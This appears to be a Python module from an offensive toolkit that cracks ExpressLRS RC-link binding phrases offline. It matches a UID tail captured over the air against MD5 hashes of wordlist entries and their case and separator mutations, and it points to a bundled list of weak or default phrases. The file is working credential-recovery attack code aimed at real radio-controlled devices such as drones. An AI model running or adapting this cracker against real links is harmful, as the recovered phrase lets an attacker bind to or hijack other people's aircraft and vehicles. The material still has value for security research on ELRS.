"""Offline binding-phrase recovery from a recovered UID tail.

ELRS explicitly documents the binding phrase as anti-collision, not security:
it is MD5'd into a 6-byte UID.  Recovering UID[2..5] over the air reduces a
wordlist search to a 32-bit filter -- any phrase whose MD5 tail matches is the
phrase with overwhelming probability.

This is credential/loot recovery only.  No control packets are produced.
"""

from __future__ import annotations

import os
import time
from dataclasses import dataclass

from . import crypto


@dataclass
class CrackResult:
    phrase: str | None
    uid: bytes | None
    tested: int
    elapsed_s: float
    confirmed: bool


def mutations(phrase: str):
    """Yield plausible case/separator variants of a candidate phrase."""
    seen = set()
    for candidate in (
        phrase,
        phrase.lower(),
        phrase.upper(),
        phrase.strip(),
        phrase.replace(" ", ""),
        phrase.replace("-", ""),
        phrase.replace("_", ""),
        phrase.replace(" ", "-").lower(),
    ):
        if candidate and candidate not in seen:
            seen.add(candidate)
            yield candidate


def crack_uid_tail(target_tail: bytes, wordlist_path: str,
                   ota_version: int = crypto.OTA_VERSION_ID,
                   max_seconds: float = 30.0) -> CrackResult:
    """Search a wordlist for a phrase whose UID tail equals target_tail.

    target_tail must be exactly 4 bytes (UID[2..6]).  Returns confirmed=True
    only on an actual MD5 match -- never on a partial/heuristic guess.
    """
    if len(target_tail) != 4:
        raise ValueError("target_tail must be 4 bytes")
    started = time.monotonic()
    tested = 0
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                phrase = line.strip()
                if not phrase or phrase.startswith("#"):
                    continue
                for candidate in mutations(phrase):
                    tested += 1
                    uid = crypto.uid_from_binding_phrase(candidate, ota_version)
                    if uid[2:6] == target_tail:
                        return CrackResult(candidate, uid, tested,
                                           time.monotonic() - started, True)
                    if time.monotonic() - started > max_seconds:
                        return CrackResult(None, None, tested,
                                           time.monotonic() - started, False)
    except OSError:
        return CrackResult(None, None, tested, time.monotonic() - started, False)
    return CrackResult(None, None, tested, time.monotonic() - started, False)


def load_default_wordlist() -> str:
    """Path to the bundled weak/default binding-phrase list."""
    return os.path.join(os.path.dirname(os.path.dirname(__file__)),
                        "data", "binding-phrases.txt")
